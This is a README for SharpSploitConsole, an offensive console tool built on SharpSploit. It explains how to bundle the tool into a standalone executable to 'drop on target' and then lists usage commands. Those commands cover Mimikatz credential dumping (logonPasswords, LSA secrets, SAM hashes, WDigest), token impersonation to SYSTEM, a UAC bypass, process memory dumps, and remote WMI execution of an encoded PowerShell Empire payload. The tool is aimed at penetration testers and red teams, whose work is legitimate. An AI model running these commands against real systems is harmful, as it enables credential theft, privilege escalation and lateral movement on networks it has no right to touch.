# SharpSploitConsole

Console Application designed to interact with SharpSploit released by @cobbr_io > https://github.com/cobbr/SharpSploit

SharpSploit is a tool written by @cobbr_io that combines many techniques/C# code from the infosec community and combines it into one sweet DLL.  It's awesome so check it out! 

Description
============
SharpSploit Console is just a quick proof of concept binary to help penetration testers or red teams with less C# experience play with some of the awesomeness that is SharpSploit.  By following the instructions below you should be able to embed both the SharpSploit.dll and System.Management.Automation.dll into the SharpSploitConsole binary, creating a standalone exe you can drop on an appropriate target sytem.  

This concept can be applied to many C# binaries.  For example, we could embed the System.Management.Automation.dll into our favorite C# NoPowershell.exe, creating a binary that doesn't rely on the System.Management.Automation.dll on the target system.

Lastly, I am aware there are probably thousands of ways to make this better, faster, cooler, stealthier etc. So please free to let me know....in a nice way. :)  I also plan to add more modules and improve others.

Contact me at:
- Twitter: @anthemtotheego

**Before submitting issues, this is just a POC and will likely not be updated actively. I encourage you to borrow, add, mod, and/or make your own.  Remember, all the awesome code out there (and there is a lot) can be taken/modified to create your own custom tools.**

![Alt text](/SharpSploitConsole/sharpsploitimg1.PNG?raw=true "SharpSploitConsole")

Installation - Quick and Dirty
==============================

**I used Windows 10, Visual Studio 2017, compiled everything for x64 architecture - your mileage may vary**

1. Download SharpSploit tool from https://github.com/cobbr/SharpSploit.git

2. Open up SharpSploit.sln in Visual Studio and compile (make sure to compile for correct architecture) - Should see drop down with Any    CPU > Click on it and open Configuration Manager > under platform change to desired architecture and select ok.

3. Download SharpSploitConsole tool and open up SharpSploitConsole.sln

4. Copy both SharpSploit.dll and System.Management.Automation.dll found in SharpSploit/bin/x64/Debug directory into                        SharpSploitConsole/bin/x64/Debug folder

5. Next we will set up visual studio to embed our DLL's into our exe so we can just have a single binary we can run on our target          machine. We will do this by doing the following:

  In visual studio:

   a. Tools > NuGet Package Manager > Package Manager Console
 
   b. Inside console run:

      Install-Package Costura.Fody
  
   c. Open up notepad and paste the following code below and save it with the name FodyWeavers.xml inside the SharpSploitConsole               directory that holds your bin, obj, properties folders.

        <?xml version="1.0" encoding="utf-8"?>
        <Weavers>
          <Costura />
        </Weavers>

6. Inside visual studio, right click References on the righthand side, choose Add Reference, then browse to the                            SharpSploitConsole/bin/x64/Debug directory where we put our two DLL's, select them and add them.

7. Compile, drop binary on target computer and have fun.

Examples
========

Mimikatz all the things (does not run DCSync) - requires admin or system:

```Mimi-All```

Runs a specific Mimikatz command of your choice - requires admin or system:

```Mimi-Command privilege::debug sekurlsa::logonPasswords```

Runs the Mimikatz command privilege::debug sekurlsa::logonPasswords - requires admin or system:

```logonPasswords```

Runs the Mimikatz command to retrieve Domain Cached Credentials hashes from registry - requires admin or system:

```LsaCache```

Runs the Mimikatz command to retrieve LSA Secrets stored in registry - requires admin or system:

```LsaSecrets```

Retrieve password hashes from the SAM database - requires admin or system:

```SamDump```

Retrieve Wdigest credentials from registry - requires admin or system:

```Wdigest```

Retrieve current user:

```whoami```

```Username```

Impersonate system user - requires admin rights:

```GetSystem```

Bypass UAC - requires binary | command | path to binary - requires admin rights:

```BypassUAC cmd.exe ipconfig C:\Windows\System32\```

```BypassUAC cmd.exe "" C:\Windows\System32\```

Ends the impersonation of any token, reverts back to initial token associated with current process:

```RevertToSelf```

Retrieve current working directory:

```CurrentDirectory```

Retrieve current directory listing:

```DirectoryListing```

Changes the current directory by appending a specified string to the current working directory:

```ChangeDirectory SomeFolder```

Retrieve hostname:

```Hostname```

Retrieve list of running processes:

```ProcessList```

Creates a minidump of the memory of a running process, requires PID | output location | output name - requires admin:

```ProcDump 2198 C:\Users\JoeBlow\Desktop memorydump.dmp```

Retrieve registry path value, requires full path argument:

```ReadRegistry HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\COM3\BuildNumber```

Write to registry, requires full path argument and value argument:

```WriteRegistry HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\COM3\RemoteAccessEnabled 1```

Retrieve users of local group remotely, requires computername | groupname | username | password:

```NetLocalGroupMembers computerName Administrators domain\username P@55w0rd!```

```NetLocalGroupMembers 192.168.1.20 Administrators .\username P@55w0rd!```

Retrieve local groups remotely, requires computername | username | password:

```NetLocalGroups computerName domain\username P@55w0rd!```

```NetLocalGroups 192.168.1.20 .\username P@55w0rd!```

Retrieve current logged on users remotely, requires computername | username | password:

```NetLoggedOnUsers computerName domain\username P@55w0rd!```

```NetLoggedOnUsers 192.168.1.20 .\username P@55w0rd!```

Retrieve user sessions remotely, requires computername | username | password:

```NetSessions computerName domain\username P@55w0rd!```

```NetSessions 192.168.1.20 .\username P@55w0rd!```

Ping systems, requires computernames:

```Ping computer1 computer2 computer3 computer4```

Port scan systems, requires computername | ports:

```PortScan computer1 80 443 445 22 23```

Run command remotely via WMI, requires computername | username | password | command - requires admin:

```WMI computer1 domain\username P@55w0rd! <entire powershell empire payload>```

```WMI computer1 .\username P@55w0rd! powershell -noP -sta -w 1 -enc <Base64>```


# Currently available options (more to come)                           
                                   
- **Mimi-All**              : Executes everything but DCSync, requires admin
- **Mimi-Command**          : Executes a chosen Mimikatz command
- **logonPasswords**        : Runs privilege::debug sekurlsa::logonPasswords
- **LsaCache**              : Retrieve Domain Cached Credentials hashes from registry
- **LsaSecrets**            : Retrieve LSA secrets stored in registry
- **SamDump**               : Retrieve password hashes from the SAM database
- **Wdigest**               : Retrieve Wdigest credentials from registry
- **whoami**                : Retrieve current user 
- **GetSystem**             : Impersonate system user, requires admin rights
- **BypassUAC**             : Bypass UAC, requires binary | command | path to binary - requires admin rights
- **RevertToSelf**          : Ends the impersonation of any token, reverts back to initial token associated with current process
- **CurrentDirectory**      : Retrieve current working directory
- **DirectoryListing**      : Retrieve current directory listing
- **ChangeDirectory**       : Changes the current directory by appending a specified string to the current working directory
- **Hostname**              : Retrieve hostname
- **ProcessList**           : Retrieve list of running processes
- **ProcDump**              : Creates a minidump of the memory of a running process, requires PID | output location | output name - requires admin
- **Username**              : Retrieve current username
- **ReadRegistry**          : Retrieve registry path value, requires full path argument
- **WriteRegistry**         : Write to registry, requires full path argument | value
- **NetLocalGroupMembers**  : Retrieve users of local group remotely, requires computername | groupname | username | password
- **NetLocalGroups**        : Retrieve local groups remotely, requires computername | username | password
- **NetLoggedOnUsers**      : Retrieve current logged on users remotely, requires computername | username | password
- **NetSessions**           : Retrieve user sessions remotely, requires computername | username | password
- **Ping**                  : Ping systems, requires computernames"
- **PortScan**              : Port scan systems, requires computername | ports
- **WMI**                   : Run command remotely via WMI, requires computername | username | password | command | requires admin
